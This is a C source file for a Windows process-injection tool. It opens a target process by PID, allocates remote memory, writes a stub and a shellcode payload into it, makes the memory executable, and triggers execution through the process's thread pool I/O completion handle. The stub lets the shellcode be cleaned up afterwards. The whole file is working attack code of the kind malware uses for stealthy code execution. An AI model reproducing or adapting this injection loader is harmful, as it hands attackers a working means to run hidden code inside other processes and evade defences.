#include <windows.h>
#include <stdio.h>
#include "IoCompletionHandle.h"
#include "SetupExecution.h"
#include "winapi.h"
#include "shellcode.h"


#include "stub_shellcode.h"




int WriteShellcode(HANDLE hTargetProcess, PVOID Remote_ShellcodeAddress, PVOID g_Shellcode, size_t g_szShellcodeSize)
{
    int res = 0;
    BOOL success = TRUE;
    DWORD oldProtect = 0;
    success = w_WriteProcessMemory(hTargetProcess, Remote_ShellcodeAddress, g_Shellcode, g_szShellcodeSize);
    if (!success)
    {
        printf("w_WriteProcessMemory failed\n");
        return -1;
    }

    success = VirtualProtectEx(hTargetProcess, Remote_ShellcodeAddress, g_szShellcodeSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!success)
    {
        printf("VirtualProtectEx failed\n");
        return -1;
    }
    return res;
}

PVOID AllocateShellcodeMemory(HANDLE hTargetProcess, size_t g_szShellcodeSize)
{
    int res = 0;
    PVOID pRemoteTpWait = w_VirtualAllocEx(hTargetProcess, g_szShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pRemoteTpWait == NULL)
    {
        printf("w_VirtualAllocEx failed\n");
        
    }
    return pRemoteTpWait;
}

SIZE_T my_ceil(float x) {
    SIZE_T i = (SIZE_T)x;
    if (x > 0 && x != i) return i + 1;
    return i;
}


#define PAGE_SIZE 0x1000
SIZE_T get_number_of_pages(SIZE_T size)
{
    return my_ceil((float)size / PAGE_SIZE) * PAGE_SIZE;

}


// MAIN
int _main(int pid)
{
    int success = 0;
    //int pid = 0;
    HANDLE hTargetProcess = INVALID_HANDLE_VALUE;
    PVOID Remote_ShellcodeAddress = NULL;
    HANDLE hIoCompletion = INVALID_HANDLE_VALUE;
    SIZE_T allocation_size = 0;
    SIZE_T stub_alloc_size = 0;
    SIZE_T shellcode_alloc_size = 0;

    

    char* stub_buffer = NULL;
    unsigned int stub_buffer_size = 0;

    hTargetProcess = GetTargetProcessHandle(pid);


    // Alloc memory for stub + shellcode
    // We are going to write stub and shellcode into 2 different memory pages so that we can easily cleanup the shellcode after execution
    stub_buffer_size = get_stub_shellcode_size();

    // Calculate number of pages needed for stub and shellcode
    shellcode_alloc_size = get_number_of_pages(shellcode_size);
    stub_alloc_size = get_number_of_pages(stub_buffer_size);

    // Allocation size is the sum of pages needed to host stub and shellcode
    allocation_size = shellcode_alloc_size + stub_alloc_size;

    printf("allocation_size : 0x%x\n", allocation_size);


    //Remote_ShellcodeAddress = AllocateShellcodeMemory(hTargetProcess, stub_buffer_size + shellcode_size);
    Remote_ShellcodeAddress = AllocateShellcodeMemory(hTargetProcess, allocation_size);
    if (Remote_ShellcodeAddress == NULL)
    {
        printf("AllocateShellcodeMemory failed\n");
        return -1;
    }

    printf("Allocated memory in remote process : 0x%p\n", Remote_ShellcodeAddress);
    printf("Shellcode will be writte @ 0x%p\n",(char *) Remote_ShellcodeAddress + stub_alloc_size);


    // Get stub, pass the address where we are going to write the shellcode to overwrite placeholders
    // We will write the shellcode in the next memory page
    // we need to pass the address where the shellcode will be written and the size of the shellcode to allow cleanup
    stub_buffer = get_stub_shellcode((char*)Remote_ShellcodeAddress + stub_alloc_size, shellcode_size);
    if (stub_buffer == NULL)
    {
        return -1;
    }

    // Write stub
    success = WriteShellcode(hTargetProcess, Remote_ShellcodeAddress, stub_buffer, stub_buffer_size);
    if (success != 0)
    {
        printf("WriteShellcode failed (stub) - res : %d\n", success);
        return -1;
    }

    // Write shellcode
    // Write shellcode in the next memory page
    success = WriteShellcode(hTargetProcess, (char*)Remote_ShellcodeAddress + stub_alloc_size, shellcode, shellcode_size);
    if (success != 0)
    {
        printf("WriteShellcode failed (shellcode) - res : %d\n", success);
        return -1;
    }

    printf("Shellcode Written in remote process\n");
    //getchar();

    hIoCompletion = GetTargetThreadPoolIoCompletionHandle(hTargetProcess);
    success = SetupExecution(hTargetProcess, hIoCompletion, Remote_ShellcodeAddress);
    
    if (success != 0)
    {
        printf("Something went wrong :( - res : %d\n", success);
    }

    // Cleanup

    CloseHandle(hIoCompletion);
    CloseHandle(hTargetProcess);

    // Free APC buffer
    free(stub_buffer);
    stub_buffer = 0;

    
    return success;
}



